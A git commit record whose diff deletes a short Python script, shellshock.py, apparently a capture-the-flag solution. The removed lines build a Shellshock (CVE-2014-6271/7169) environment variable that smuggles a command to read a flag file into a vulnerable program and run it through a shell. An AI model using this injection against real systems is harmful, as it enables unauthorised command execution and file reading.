360c458f31d426c13c061e386cc5f50f8a14ef43
b09780978 <b09780978@gmail.com>
2017-07-22 00:12:30 +0800

    delete shellshock.py

--- shellshock.py
+++
@@ -1,7 +0,0 @@
-import subprocess
-# tip:
-#     use CVE-2014-6271 or CVE-2014-7169
-
-shellshock = "env vuln='() { :;}; /bin/cat /home/shellshock/flag' /home/shellshock/shellshock"
-
-subprocess.call(shellshock, shell=True)
